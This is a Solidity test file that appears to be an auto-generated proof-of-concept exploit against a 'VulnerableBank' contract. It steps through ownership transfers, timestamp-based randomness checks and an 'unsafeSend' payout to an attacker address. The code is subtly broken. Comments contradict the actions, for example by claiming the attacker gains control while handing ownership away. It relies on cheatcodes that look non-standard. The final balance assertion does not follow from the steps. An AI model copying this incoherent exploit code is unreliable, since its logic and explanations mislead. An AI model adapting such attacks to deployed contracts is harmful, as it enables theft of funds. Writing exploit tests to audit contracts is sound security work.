// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import "./basetest.sol";
import "../src/VulnerableBank.sol";

contract PocTest is BaseTestWithBalanceLog {
    VulnerableBank target;
    address attacker = address(0xBAD);

    function setUp() public {
        target = new VulnerableBank();
        vm.deal(attacker, 10 ether);
    }

    function testExploit() public balanceLog {
        // Step 1: Deposit initial amount
        uint256 initialDeposit = vm.random(1000) + 1;
        target.deposit{value: initialDeposit}();

        // Step 2: Transfer ownership to attacker to gain control of the contract
        address victim1 = address(0xAAA);
        vm.prank(attacker);
        target.transferOwnership(victim1);

        // Step 3: Call the random() function multiple times at different timestamps
        uint256[3] memory randomResults;
        for (uint256 i = 0; i < 3; ++i) {
            vm.warp(vm.timestamp() + i * 1 seconds);
            randomResults[i] = target.random();
        }

        // Step 4: Assert that the random results are not equal, demonstrating non-determinism
        for (uint256 i = 0; i < 3; ++i) {
            for (uint256 j = i + 1; j < 3; ++j) {
                assertNotEq(randomResults[i], randomResults[j]);
            }
        }

        // Step 5: Attempt an emergencyWithdraw by attacker should fail due to ownership transfer
        vm.expectRevert();
        target.emergencyWithdraw();

        // Step 6: Transfer back ownership and deposit more eth for further exploitation
        vm.prank(victim1);
        target.transferOwnership(attacker);

        uint256 additionalDeposit = vm.random(1000) + 1;
        target.deposit{value: additionalDeposit}();

        // Step 7: Call the unsafeSend with attacker's address and random amount
        uint256 sendAmount = vm.random(additionalDeposit);
        target.unsafeSend(attacker, sendAmount);

        // Step 8: Assert that the balance of attacker is not depleted as expected due to vulnerability
        assertEq(target.balances(attacker), initialDeposit + additionalDeposit - sendAmount);
    }
}